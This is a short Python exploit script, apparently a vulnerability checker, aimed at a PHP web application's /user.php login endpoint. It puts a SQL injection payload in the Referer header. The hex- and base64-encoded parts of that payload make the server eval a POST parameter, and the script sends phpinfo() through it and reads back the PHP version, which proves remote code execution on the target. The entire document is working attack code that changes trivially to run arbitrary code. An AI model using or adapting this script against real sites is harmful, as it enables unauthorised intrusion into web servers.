import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

headers = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36',
    'Content-Type' : 'application/x-www-form-urlencoded',
    'Referer': '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:193:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243676b5831425055315262634841784d6a4e644b54733d2729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1\' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'
}
data = "action=login&pp123=phpinfo();"


regular = "(PHP Version [0-9\.]+)"

def verify(url):
    url = url + "/user.php"
    try:
        """
        检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
        """
        req = requests.post(url, headers = headers, data=data, timeout = 20, verify = False)
        info = re.findall(regular, req.text)
        if len(info) != 0:
            return info[0]
        else:
            return ""
    except Exception as e:
        raise e
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行代码 phpinfo(), PHP 版本：", info)
    else:
        print("[-]漏洞不存在")
